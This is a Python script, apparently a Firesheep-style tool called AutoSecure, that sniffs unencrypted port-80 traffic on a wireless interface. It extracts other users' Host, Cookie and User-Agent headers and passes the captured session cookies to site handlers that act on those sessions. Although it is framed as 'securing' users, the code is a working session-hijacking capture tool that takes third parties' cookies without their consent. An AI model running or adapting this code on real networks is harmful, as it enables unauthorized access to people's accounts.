#!usr/bin/env python
import os
import pwd
import re
import sys

import nids

import requests
from pyquery import PyQuery as pq

from autosecure.handlers import handler_map
from autosecure.util import re_extract

DEFAULT_UA = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; MathPlayer 2.10b; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"

class AutoSecure:
    def __init__(self, interface="wlan0", uid="nobody"):
        self.interface = interface
        self.secured_users = set()

        self.nids_init()
        self.drop_privs(uid)

    def nids_init(self):
        nids.param("device", self.interface)
        nids.param("pcap_filter", "port 80")
        nids.param("san_num_hosts", 0)
        #nids.param("dev_addon", ?) #might need this for monitor mode
        nids.chksum_ctl([('0.0.0.0/0', False)]) # disable checksumming
        nids.init()
        nids.register_tcp(self.handle_tcp)
        self.nids = nids
        

    def drop_privs(self, uid):
        (uid, gid) = pwd.getpwnam(uid)[2:4]
        os.setgroups([gid,])
        os.setgid(gid)
        os.setuid(uid)
        if 0 in [os.getuid(), os.getgid()] + list(os.getgroups()):
            raise Exception("error - drop root, please!")

    def handle_tcp(self, stream):
        if stream.nids_state == nids.NIDS_JUST_EST:
            ((src, sport), (dst, dport)) = stream.addr
            if dport == 80:
                stream.server.collect = 1
            return
        elif stream.nids_state == nids.NIDS_DATA:
            stream.discard(0)

        bytes = stream.server.data[:stream.server.count]
        session = self.extract_session(bytes)
        if session:
            self.secure_sesion(session)

    def extract_session(self, packet):
        host = re_extract('Host: ([^\r\n]+)[\r\n]', packet)
        if not host:
            return
        cookie = re_extract('Cookie: ([^\r\n]+)[\r\n]', packet)
        if not cookie:
            return
        ua = re_extract('User-Agent: ([^\r\n]+)[\r\n]', packet)
        if not ua:
            ua = DEFAULT_UA
        return {
            'Host': host,
            'Cookie': cookie,
            'User-Agent': ua,
        }

    def secure_sesion(self, session):
        handler = handler_map.get(session['Host'])
        if not handler:
            return
        h = handler()
        user = h.extract_user(session)
        if user  in self.secured_users:
            return
        print "Securing", h.name, user
        self.secured_users.add(user)
        return h.secure(session)

    def secure_sheep(self):
        self.nids.run()

def main():
    from optparse import OptionParser
    parser = OptionParser()
    parser.add_option("-i", "--interface", dest="interface", action="store", default="wlan0")
    (options, args) = parser.parse_args()

    a = AutoSecure(interface=options.interface)
    a.secure_sheep()

if __name__ == "__main__":
    main()
